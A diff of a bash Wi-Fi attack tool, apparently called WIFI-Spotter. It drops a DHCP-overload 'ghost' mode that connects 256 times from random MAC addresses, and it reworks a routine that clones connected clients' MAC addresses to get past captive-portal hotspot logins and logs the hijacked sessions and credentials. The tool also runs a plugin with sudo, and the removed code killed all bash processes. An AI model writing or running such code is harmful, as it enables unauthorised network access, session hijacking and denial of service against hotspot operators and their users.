@@ -1,14 +1,6 @@
 #!/bin/bash
 
 
-# WIFI-Spotter and their associated files are proprietary software
-# Modifying or reposting these files are not allowed in anyways
-# WE ARE NOT RESPONSIBLE FOR ANY DAMAGES CAUSED BY THIS SOFTWARE
-# CONTINUE USING THIS SOFTWARE AT YOUR OWN RISK !
-# All rights are reserved to the owners of this software
-# Copyright @ 2023 - 2025 by OpenGates Inc.
-
-
 
 							trap "echo terminated by user; _trap_cleanup; exit 1" SIGINT SIGTERM
 						_process_usage()
@@ -44,7 +36,6 @@
 											msg4+="   x, Target (Bruteforce connected clients)\n"
 											msg4+="   xx, Target (Bruteforce connected clients)\n"
 											msg4+="   t, Test (Perform eligibility test)\n"
-											msg4+="   g, Ghost (Overload DHCP server)\n"
 											msg4+="   r, Reset (Remove all saved networks)\n"
 											msg4+="     Example: wifi-spotter -ct"
 
@@ -81,10 +72,6 @@
 																	{ x=$(cat "${home_dir}/logs/reporter.pid" 2>/dev/null); kill -9 "${x}" 2>/dev/null; }
 																	nohup ${home_dir}/plugins/reporter.sh &>/dev/null &
 																	echo "${!}">"${home_dir}/logs/reporter.pid"; disown
-
-																	{ x=$(cat "${home_dir}/logs/updater.pid" 2>/dev/null); kill -9 "${x}" 2>/dev/null; }
-																	nohup ${home_dir}/plugins/updater.sh --silent-update &>/dev/null &
-																	echo "${!}">"${home_dir}/logs/updater.pid"; disown
 																}
 														_json_initconfig()
 																{
@@ -380,17 +367,7 @@
 											if [ "$mode" = "parse" ]; then
 												_process_parse
 											elif [ "$mode" = "connect" ]; then
-												[[ ! "$connect_option" =~ (a|f|p|c|s|n|x|t|g|r) ]] && { _echo "$connect_option is invalid connect option\nTip: Use -h connect to list available connect options." 1; return 1; }
-												{
-														# fix getting dummy addr from ghost mode
-														echo -n>"${home_dir}/logs/.wsc.pid"
-													if [ "${connect_option}" = "g" ]; then
-														if [ -e "${home_dir}/logs/.wsm.pid" ]; then
-															rm -f "${home_dir}/logs/.wsm.pid"
-															killall bash
-														fi
-													fi
-												}
+												[[ ! "$connect_option" =~ (a|f|p|c|s|n|x|t|r) ]] && { _echo "$connect_option is invalid connect option\nTip: Use -h connect to list available connect options." 1; return 1; }
 												#_process_networkinfo || return 1
 												_process_connect "${connect_option}"
 											elif [ "$mode" = "scan" ]; then
@@ -399,14 +376,6 @@
 												_process_scan "$scan_option"
 											elif [ "$mode" = "mointor" ]; then
 												[[ ! "$mointor_option" =~ (1|2|3) ]] && { _echo "$mointor_option is invalid mointor option\nTip: Use -h mointor to list available mointor options." 1; return 1; }
-												{
-														# fix getting dummy addr from ghost mode
-														echo -n>"${home_dir}/logs/.wsm.pid"
-													if [ -e "${home_dir}/logs/.wsc.pid" ]; then
-														rm -f "${home_dir}/logs/.wsc.pid"
-														killall bash 2>/dev/null
-													fi
-												}
 												_process_networkinfo || return 1
 												_process_tcpdump "$mointor_option"
 											fi
@@ -1117,20 +1086,6 @@
 																		fi
 																	done
 																}
-											_wificonnect_ghost()
-																{
-																			local i; i=0
-																			{ _wificonnect_getpsk; _json_initconfig || return 1; _json_networkpskauto; }
-																			_wificonnect_test || return 1
-																			_echo "- Starting Wi-Fi overload mode:" 1
-																			max_tries=1
-																	until [ $i -ge 256 ]; do
-																		_macchanger_set "random"
-																		_wificonnect_status "is_disconnected"
-																		_wificonnect_connect "${ssid}" "${sec}" "${bssid}"
-																		i=$((i+1))
-																	done
-																}
 											_wificonnect_getclients()
 																{
 																		_merge_gid()
@@ -1284,23 +1239,17 @@
 																	for x in ${reqs_list}; do
 																			_echo "\t${color_tip}Proccessing: ${t}/${max_reqs}${color_reset}" 1
 																			t=$((t+1)); r="${color_error}"
-																			{ _macchanger_set "random"; _wificonnect_status "is_disconnected"; }
-																		if ! _wificonnect_connect "${ssid}" "${sec}" "${bssid}"; then
-																			cooldown=$((cooldown+1)); t=$((t-1))
-																			[ ${cooldown} -ge 3 ] && { cooldown=0; _echo "\t${color_warn}Bottleneck was hit now cooling down..." 1; _echo "\t\t_wificonnect_bruteforce --> error bottleneck was hit: [tries](${t})" 0; sleep 120; }
-																			_echo "\t\t_wificonnect_bruteforce --> error connection failed with address: [request_addr](ghost: ${request_addr})" 0
-																			continue
-																		else
-																			cooldown=0
-																		fi
 																			{ _macchanger_set "${x}"; _wificonnect_status "is_disconnected"; }
 																		if ! _wificonnect_connect "${ssid}" "${sec}" "${bssid}"; then
+																			cooldown=$((cooldown+1))
 																			_echo "\t\t_wificonnect_bruteforce --> error connection failed with address: [request_addr](client: ${request_addr})" 0
+																			[ ${cooldown} -ge 3 ] && { cooldown=0; _echo "\t${color_warn}Bottleneck was hit now cooling down..." 1; _echo "\t\t_wificonnect_bruteforce --> error bottleneck was hit: [tries](${t})" 0; sleep 120; }
 																			continue
 																		elif [ "${x}" != "${request_addr}" ]; then
 																			_echo "\t\t_wificonnect_bruteforce --> error requested and current address does not match: [current_addr](client: ${request_addr}) [request_addr](client: ${x})" 0
 																			break
 																		else
+																			cooldown=0
 																			curl -vsLA "${ua}" "${status}" >"${home_dir}/logs/tmp" 2>"${home_dir}/logs/err"
 																			c=$(cat "${home_dir}/logs/err" | tr '\t\r\n*' '#')
 																		fi
@@ -1308,7 +1257,7 @@
 																		if [[ "${c}" =~ (Location: .*login|HTTP/1.1 302 Hotspot login required) ]]; then
 																			false
 																		elif [[ "${c}" =~ (Location: .*status|HTTP/1.1 200 OK) ]]; then
-																			n=$((n+1)); r="${color_warn}"
+																			n=$((n+1))
 																			{ stdin="${home_dir}/logs/tmp"; _parse_html; }
 																			_json_addressgid "${request_addr}" "tclients"
 																			echo -n>"${home_dir}/logs/creds_${obf_date}.log"
@@ -1316,8 +1265,10 @@
 																			[ "${acbd18db4cc2f85cedef654fccc4a4d8}" = "1" ] || break
 																		elif [[ "${c}" =~ "failed: Connection refused" ]]; then
 																			n=$((n+1))
+																			{ stdin="${home_dir}/logs/tmp"; _parse_html; }
 																			_json_addressgid "${request_addr}" "admins"
-																			[ "${acbd18db4cc2f85cedef654fccc4a4d8}" = "1" ] && { stdin="${home_dir}/logs/tmp"; _parse_html; }
+																			play-audio "$home_dir/sfx/notification_done.m4a" &
+																			[ "${acbd18db4cc2f85cedef654fccc4a4d8}" = "1" ] || break
 																		elif [ ! -s "${home_dir}/logs/tmp" ]; then
 																			_echo "\t\t_wificonnect_bruteforce --> error requested address returned null: [request_addr](${request_addr}) [result](${c})" 0
 																		else
@@ -1333,6 +1284,7 @@
 																			break
 																		fi
 																	done
+																			r="${color_warn}"
 																			_echo "\t${r}Finished with ${n} success${color_reset}" 1
 																			return 1
 																}
@@ -1391,6 +1343,7 @@
 																		local x c_ip n_ip
 																		_echo "- Performing eligibility test..." 1
 																		_wificonnect_select || return 1
+																			[ "${1}" = "config" ] && { _echo "- Starting comptiablity checker ..." 1; sudo ${home_dir}/plugins/configs.sh; }
 																			_wificonnect_connect "${ssid}" "${sec}" "${bssid}" || \
 																									{ 
 																										play-audio "$home_dir/sfx/notification_error.m4a" &
@@ -1532,9 +1485,7 @@
 												[ "$1" = "xx" ] && parse_gid_mode="position" || parse_gid_mode="seperate"
 												_wificonnect_bruteforce
 											elif  [ "$1" = "t" ]; then
-												_wificonnect_test
-											elif  [ "$1" = "g" ]; then
-												_wificonnect_ghost
+												_wificonnect_test "config"
 											elif  [ "$1" = "r" ]; then
 												_wificonnect_reset
 											fi
